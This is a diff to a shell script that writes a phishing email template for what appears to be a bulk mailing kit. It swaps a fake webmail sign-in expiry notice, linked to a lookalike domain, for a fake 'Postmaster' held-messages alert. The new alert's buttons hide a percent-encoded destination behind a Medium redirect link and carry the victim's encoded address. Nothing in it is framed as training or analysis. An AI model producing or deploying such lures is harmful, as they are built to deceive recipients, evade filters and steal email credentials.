@@ -202,66 +202,12 @@ EOL
 # Create a sample HTML email content (email.html)
 echo "Creating email.html with email content..."
 cat > email.html <<EOL
-<html><head>
+<!DOCTYPE HTML>
+
+<html><head><title></title>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="x-mailer" content="Microsoft Outlook 16.0">
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Webmail Notification</title>
-  <style type="text/css">
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Roboto, Tahoma, Helvetica, sans-serif;
-      color: #333333;
-      line-height: 1.5;
-    }
-    .header-bar {
-      background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */
-      color: #ffffff;
-      padding: 10px;
-      font-size: 12px;
-    }
-    .content {
-      padding: 20px;
-      max-width: 600px;
-      margin: 0 auto;
-    }
-    h1 {
-      color: #ee6111; /* Kept orange accent */
-      text-align: center;
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-    .footer {
-      text-align: center;
-      font-size: 12px;
-      color: #777777;
-      margin-top: 30px;
-    }
-  </style>
 </head>
-<body>
-  <table width="100%" cellspacing="0" cellpadding="0">
-    <tbody><tr>
-      <td class="header-bar">
-        Mail Server Account Update Notification
-      </td>
-    </tr>
-  </tbody></table>
-
-  <div class="content">
-    <h1>Webmail</h1>
-    <p>Your sign-in method will stop functioning on 15/08/2025 (<u><em>Confirmation Needed</em></u>), you must take prompt steps to maintain and prevent limitations to your mail account.<br><br><span style="font-size: 15pt;"><font color="#ff0000"><u><a href="http://www.wabmail.gitse.in#{base64-encryptedrecipents-email}">Start Process</a></u></font></span></p>
-	    <p>View the attached document for further instructions.</p>
-    <p>Thank you.</p>
-  </div>
-
-  <div class="footer">
-    <p>&copy; 2025&nbsp;Webmail Inc.  For intended recipient.</p>
-  </div>
-
-</body></html>
+<body style="margin: 0.4em; font-size: 14pt;"><div style="text-align: left; color: rgb(34, 34, 34); text-transform: none; line-height: 1.6; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; margin-bottom: 16px; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><p style="margin: 0px 0px 12px; box-sizing: border-box;"><strong style="font-weight: bolder; box-sizing: border-box;">&nbsp;Postmaster</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<strong style="font-weight: bolder; box-sizing: border-box;">{recipient-domain}</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<strong style="font-weight: bolder; box-sizing: border-box;">Recipient: planning</strong>&nbsp;<br style="box-sizing: border-box;"></p><table style="padding: 0px; width: 557px; height: 10px; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr height="10" style="box-sizing: border-box;"><td width="180" height="10" style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; box-sizing: border-box;" bgcolor="#c00000">&nbsp;</td><td width="4" height="10" style="margin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; box-sizing: border-box;" bgcolor="#ffffff"></td><td width="180" height="10" style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; box-sizing: border-box;" bgcolor="#cccccc"></td><td width="4" height="10" style="margin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; box-sizing: border-box;" bgcolor="#ffffff"></td><td width="180" height="10" style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; box-sizing: border-box;" bgcolor="#cccccc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr></tbody></table><br style="box-sizing: border-box;"><p style="border-radius: 0px; font-family: arial, sans-serif; margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box; box-shadow: none; text-shadow: none;">&nbsp; We're reaching out&nbsp;to let you know that we were unable to deliver&nbsp;some message(s) to your<br style="box-sizing: border-box;">&nbsp; email address due to<span>&nbsp;</span><span style="border-radius: 0px; color: rgb(214, 40, 40); box-sizing: border-box; box-shadow: none; text-shadow: none;" dir="ltr">security&nbsp;restrictions<span>&nbsp;</span><font color="#000000" style="box-sizing: border-box;">on your mail&nbsp;server.</font></span></p><p style="border-radius: 0px; font-family: arial, sans-serif; margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box; box-shadow: none; text-shadow: none;"><span style="border-radius: 0px; color: rgb(214, 40, 40); box-sizing: border-box; box-shadow: none; text-shadow: none;" dir="ltr"><font color="#000000" style="box-sizing: border-box;">&nbsp; It appears that your system settings is currently blocking incoming messages.</font></span></p><p style="margin: 0px 0px 12px; box-sizing: border-box;"><strong style="font-weight: bolder; box-sizing: border-box;">&nbsp; Account Information:</strong></p><p style="margin: 0px 0px 12px; box-sizing: border-box;">&nbsp;&nbsp;Email Address: {recipient-email}</p><p style="margin: 0px 0px 12px; box-sizing: border-box;">&nbsp;&nbsp;Status:&nbsp;<span style="color: rgb(243, 12, 46); box-sizing: border-box;">Held</span></p><div style="text-align: center; box-sizing: border-box;"><a style="margin: 8px 4px; padding: 10px 20px; border-radius: 4px; color: rgb(255, 255, 255); font-weight: bold; text-decoration: none; display: inline-block; cursor: pointer; box-sizing: border-box; background-color: rgb(0, 122, 204);" href="https://medium.com/m/global-identity-2?redirectUrl=%68%74%74%70%73%3A%2F%2F%66%72%65%61%6E%64%63%6F%6E%73%75%6C%74%69%6E%67%2E%6E%65%74%2F%30%30%31%2F%23%3F%30%30%38%38%33%30%39%30%30%37%46%61%6D%69%6C%79%3D{base64-encryptedrecipents-email}" target="_blank" rel="noreferrer">Allow Message</a><span>&nbsp;</span><span style="box-sizing: border-box;">&nbsp;</span>&nbsp; &nbsp;<a style="margin: 8px 4px; padding: 10px 20px; border-radius: 4px; color: rgb(33, 33, 33); font-weight: bold; text-decoration: none; display: inline-block; cursor: pointer; box-sizing: border-box; background-color: rgb(224, 224, 224);" href="https://medium.com/m/global-identity-2?redirectUrl=%68%74%74%70%73%3A%2F%2F%66%72%65%61%6E%64%63%6F%6E%73%75%6C%74%69%6E%67%2E%6E%65%74%2F%30%30%31%2F%23%3F%30%30%38%38%33%30%39%30%30%37%46%61%6D%69%6C%79%3D{base64-encryptedrecipents-email}" target="_blank" rel="noreferrer">Review Message</a></div></div><div style="text-align: center; color: rgb(102, 102, 102); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial, sans-serif; font-size: 10px; font-style: normal; font-weight: 400; margin-top: 16px; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">&copy; 2025. AII Rights Reserved.</div></body></html>
 EOL
 
 # Create a sample txt subject content (subject.txt)
